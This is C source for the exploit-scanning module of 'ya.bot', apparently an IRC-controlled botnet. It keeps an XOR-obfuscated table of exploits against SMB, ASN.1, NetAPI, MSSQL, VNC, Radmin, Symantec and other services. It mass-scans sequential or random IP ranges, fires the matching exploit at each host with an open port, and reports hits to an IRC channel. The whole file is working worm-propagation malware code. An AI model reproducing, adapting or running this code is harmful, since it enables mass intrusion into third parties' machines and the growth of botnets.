/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_EXPSCAN

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original idea by racerx90
//botbotbotbotbotbotbotbotbotbotbotbotbot

DWORD WINAPI expscan_main(LPVOID param)
{
	SExpScanList rgSExploitList[] =
	{
#ifndef NO_EXPSCANASN1
			{"\xA8\xBA\xA7\xF8\xFA\xF0", 139, expscan_asn1}, //asn139
			{"\xA8\xBA\xA7\xFD\xFD\xFC", 445, expscan_asn1}, //asn445
#endif
#ifndef NO_EXPSCANFTP
			{"\xAF\xBD\xB9\xBA\xAA\xA8\xA7", 21, expscan_ftp}, //ftpscan
#endif
#ifndef NO_EXPSCANMYUDF
			{"\xA4\xB0\xBC\xAD\xAF", 3306, expscan_myudf}, //myudf
#endif
#ifndef NO_EXPSCANREALVNC
			{"\xBB\xAC\xA8\xA5\xBF\xA7\xAA", 5900, expscan_realvnc}, //realvnc
#endif
#ifndef NO_EXPSCANSMB
			{"\xBA\xA4\xAB\xF8\xFA\xF0", 139, expscan_smb}, //smb139
			{"\xBA\xA4\xAB\xFD\xFD\xFC", 445, expscan_smb}, //smb445
#endif
#ifndef NO_EXPSCANSMTP
			{"\xBA\xA4\xBD\xB9\xBA\xAA\xA8\xA7", 25, expscan_smtp}, //smtpscan
#endif
#ifndef NO_EXPSCANMSSQL
			{"\xA4\xBA\xBA\xB8\xA5", 1433, mssql}, //mssql
#endif
#ifndef NO_EXPSCANNETAPI
			{"\xA7\xAC\xBD\xA8\xB9\xA0\xF8\xFA\xF0", 139, netapi}, //netapi139
#endif
#ifndef NO_EXPSCANRADMIN
			{"\xBB\xA8\xAD\xA4\xA0\xA7", 4899, expscan_radmin}, //radmin
#endif
#ifndef NO_EXPSCANSYM
			{"\xBA\xB0\xA4\xF8", 2967, sym}, //sym1
			{"\xBA\xB0\xA4\xFB", 2968, sym}, //sym2
#endif
#ifndef NO_EXPSCANVNC
			{"\xBF\xA7\xAA\xB9\xBA", 5900, vncps}, //vncps
#endif
#ifndef NO_EXPSCANWDNS
			{"\xBE\xAD\xA7\xBA", 1025, wdns}, //wdns
#endif
			{NULL, 0, NULL}
	};
	DWORD dwTime;
	FD_SET fdset;
	int i, nExploit, nPort = 0, nSize;
	sockaddr_in peer, sin;
	SExpScanInfo s_esi;
	SExpScan s_es = *((SExpScan *)param);
	TIMEVAL timeout;
	unsigned long cmdon = 1, cmdoff = 0;
	ULONG cip, end;

#ifndef NO_DEBUG
		debug_print("Starting exploit scan thread, expscan_main()");
#endif

	if (!ip_validip(s_es.m_szIP))
	{
		if ((!s_es.m_bSilent) && (s_es.m_bVerbose))
				irc_message(s_es.m_bsock, s_es.m_szAction, s_es.m_szDestination,
						(char *)string_expscaninvalidipport,
						CBLUE, string_replyexpscan, CEND, string_replydotbot);
			thread_remove(THREAD_EXPSCAN);
			return 0;
	}
	if (atoi(s_es.m_szExploitName))
			nPort = atoi(s_es.m_szExploitName);
	else
	{
		for (i = 0; i < ARRAYSIZE(rgSExploitList); i++)
		{
			if (!rgSExploitList[i].m_szExploitName)
					break;
				crypto_xor(rgSExploitList[i].m_szExploitName, xorkey);
			if (strcmp(s_es.m_szExploitName, rgSExploitList[i].m_szExploitName) == 0)
			{
					nPort = rgSExploitList[i].m_nExploitPort;
					nExploit = i;
					crypto_xor(rgSExploitList[i].m_szExploitName, xorkey);
					break;
			}
				crypto_xor(rgSExploitList[i].m_szExploitName, xorkey);
		}
	}
	if ((nPort < 1) || (nPort > 65535))
	{
		if ((!s_es.m_bSilent) && (s_es.m_bVerbose))
				irc_message(s_es.m_bsock, s_es.m_szAction, s_es.m_szDestination,
						(char *)string_expscaninvalidipport,
						CBLUE, string_replyexpscan, CEND, string_replydotbot);
			thread_remove(THREAD_EXPSCAN);
			return 0;
	}
	if (s_es.m_nSockets > 64)
			s_es.m_nSockets = 64;
		cip = inet_addr(s_es.m_szIP);
		sin.sin_family = AF_INET;
		sin.sin_port = htons(nPort);
		timeout.tv_sec = s_es.m_nDelay;
		timeout.tv_usec = 0;
	if (!s_es.m_bRandom)
	{
		if ((!s_es.m_bSilent) && (s_es.m_bVerbose))
				irc_message(s_es.m_bsock, s_es.m_szAction, s_es.m_szDestination,
						(char *)string_expscansequentialscanstarted,
						CBLUE, string_replyexpscan, CEND, string_replydotbot,
						CBLUE, CEND, s_es.m_szIP,
						CBLUE, CEND, s_es.m_szExploitName,
						CBLUE, CEND, s_es.m_nSockets,
						CBLUE, CEND, s_es.m_nDelay,
						CBLUE, CEND, s_es.m_dwTime);
	}
	else
	{
		if ((!s_es.m_bSilent) && (s_es.m_bVerbose))
				irc_message(s_es.m_bsock, s_es.m_szAction, s_es.m_szDestination,
						(char *)string_expscanrandomscanstarted,
						CBLUE, string_replyexpscan, CEND, string_replydotbot,
						CBLUE, CEND, s_es.m_szIP,
						CBLUE, CEND, s_es.m_szExploitName,
						CBLUE, CEND, s_es.m_nSockets,
						CBLUE, CEND, s_es.m_nDelay,
						CBLUE, CEND, s_es.m_dwTime);
	}
		dwTime = GetTickCount();
	while (TRUE)
	{
			FD_ZERO(&fdset);
			fdset.fd_count = s_es.m_nSockets;
			end = htonl(htonl(cip) + s_es.m_nSockets);
		if (s_es.m_bRandom)
				_snprintf(g_szScanning, sizeof(g_szScanning) - 1,
						string_expscancurrentlyscanning,
						CGREEN, string_replyexpscan, CEND, string_replydotbot,
						CBLUE, CEND, inet_ntoa(*(PIN_ADDR)&cip),
						inet_ntoa(*(PIN_ADDR)&cip),
						CBLUE, s_es.m_szExploitName, CEND);
		else
				_snprintf(g_szScanning, sizeof(g_szScanning) - 1,
						string_expscancurrentlyscanning,
						CGREEN, string_replyexpscan, CEND, string_replydotbot,
						CBLUE, CEND, inet_ntoa(*(PIN_ADDR)&cip),
						inet_ntoa(*(PIN_ADDR)&end),
						CBLUE, s_es.m_szExploitName, CEND);
		for (i = 0; i < s_es.m_nSockets; i++)
		{
				fdset.fd_array[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if (fdset.fd_array[i] == INVALID_SOCKET)
					continue;
				ioctlsocket(fdset.fd_array[i], FIONBIO, &cmdon);
				sin.sin_addr.s_addr = cip;
				connect(fdset.fd_array[i], (sockaddr *)&sin, sizeof(sin));
			if (s_es.m_bRandom)
					cip = inet_addr((const char *)expscan_randomip(s_es.m_szIP));
			else
					cip = htonl(htonl(cip) + 1);
		}
			select(0, NULL, &fdset, NULL, &timeout);
		for (i = 0; i < s_es.m_nSockets; i++)
		{
			if (FD_ISSET(fdset.fd_array[i], &fdset))
			{
				if (fdset.fd_array[i] == SOCKET_ERROR)
						continue;
					memset(&peer, 0, sizeof(peer));
					nSize = sizeof(peer);
					getpeername(fdset.fd_array[i], (sockaddr *)&peer, &nSize);
				if (strcmp(inet_ntoa(peer.sin_addr), string_expscannullip) != 0)
				{
					if (atoi(s_es.m_szExploitName))
					{
							Sleep(FLOOD_DELAY);
						if (!s_es.m_bSilent)
								irc_message(s_es.m_bsock,
										(char *)string_ircprivmsg, s_es.m_szResultChannel,
										(char *)string_expscanopenport,
										CGREEN, string_replyexpscan, CEND, string_replydotbot,
										CBLUE, CEND, inet_ntoa(peer.sin_addr),
										CBLUE, CEND, nPort);
							Sleep(FLOOD_DELAY);
					}
					else
					{
							ioctlsocket(fdset.fd_array[i], FIONBIO , &cmdoff);
							s_esi.m_csock = fdset.fd_array[i];
							strncpy(s_esi.m_szIP,
									inet_ntoa(peer.sin_addr),
									sizeof(s_esi.m_szIP) - 1);
							s_esi.m_nPort = nPort;
							strncpy(s_esi.m_szExploitName,
									s_es.m_szExploitName,
									sizeof(s_esi.m_szExploitName) - 1);
							s_esi.m_bsock = s_es.m_bsock;
							strncpy(s_esi.m_szResultChannel,
									s_es.m_szResultChannel,
									sizeof(s_esi.m_szResultChannel) - 1);
							s_esi.m_bSilent = s_es.m_bSilent;
							s_esi.m_bVerbose = s_es.m_bVerbose;
							rgSExploitList[nExploit].execexp((s_esi));
					}
				}
					closesocket(fdset.fd_array[i]);
			}
		}
		if ((GetTickCount() - dwTime) >= (s_es.m_dwTime * 60000))
				break;
	}
	if ((!s_es.m_bSilent) && (s_es.m_bVerbose))
			irc_message(s_es.m_bsock, s_es.m_szAction, s_es.m_szDestination,
					(char *)string_expscanfinished,
					CBLUE, string_replyexpscan, CEND, string_replydotbot,
					CBLUE, CEND, (GetTickCount() - dwTime) / 60000,
					CBLUE, CEND, s_es.m_szExploitName,
					CBLUE, CEND, inet_ntoa(*(PIN_ADDR)&cip),
					CBLUE, CEND, g_nTransfers);
		thread_remove(THREAD_EXPSCAN);
		return 0;
}

char *expscan_randomip(char *pszIP)
{
	int ip[4];
	static char s_szBuffer[16];

#ifndef NO_DEBUG
		debug_print("Getting random ip, expscan_randomip()");
#endif

		srand(GetTickCount());
		sscanf(pszIP, string_setip, &ip[0], &ip[1], &ip[2], &ip[3]);
	if (ip[0] == 0)
			ip[0] = rand() % 255;
	if (ip[1] == 0)
			ip[1] = rand() % 255;
	if (ip[2] == 0)
			ip[2] = rand() % 255;
	if (ip[3] == 0)
			ip[3] = rand() % 255;
		_snprintf(s_szBuffer, sizeof(s_szBuffer) - 1,
				string_setip,
				ip[0],
				ip[1],
				ip[2],
				ip[3]);
		return s_szBuffer;
}

int expscan_recv(SOCKET s, char *buf, int len, int flags)
{
	FD_SET fdset;
	TIMEVAL timeout;
	unsigned long cmd = 1;

#ifndef NO_DEBUG
		debug_print("Receving data, expscan_recv()");
#endif

	if (ioctlsocket(s, FIONBIO, &cmd) == SOCKET_ERROR)
			return 0;
		timeout.tv_sec = TIMEOUT_RECV / 1000;
		timeout.tv_usec = 0;
		FD_ZERO(&fdset);
		FD_SET(s, &fdset);
	if (select(0, &fdset, NULL, NULL, &timeout) == SOCKET_ERROR)
			return 0;
		return recv(s, buf, len, flags);
}

char *expscan_setip(SOCKET bsock, char *pszParameter)
{
	int nSize;
	SOCKADDR sa;
	static char s_szIP[16];

#ifndef NO_DEBUG
		debug_print("Setting ip for scanner, expscan_setip()");
#endif

		memset(&sa, 0, sizeof(sa));
		nSize = sizeof(sa);
	if (getsockname(bsock, &sa, &nSize) == SOCKET_ERROR)
			return NULL;
	if (strcmp(string_expscanparametera, pszParameter) == 0)
			_snprintf(s_szIP, sizeof(s_szIP) - 1,
					string_setip,
					(BYTE)sa.sa_data[2],
					(BYTE)sa.sa_data[3],
					(BYTE)sa.sa_data[4],
					0);
	else if (strcmp(string_expscanparameterb, pszParameter) == 0)
			_snprintf(s_szIP, sizeof(s_szIP) - 1,
					string_setip,
					(BYTE)sa.sa_data[2],
					(BYTE)sa.sa_data[3],
					0,
					0);
	else if (strcmp(string_expscanparameterc, pszParameter) == 0)
			_snprintf(s_szIP, sizeof(s_szIP) - 1,
					string_setip,
					(BYTE)sa.sa_data[2],
					0,
					0,
					0);
	else
			strncpy(s_szIP, pszParameter, sizeof(s_szIP) - 1);
		return s_szIP;
}
#endif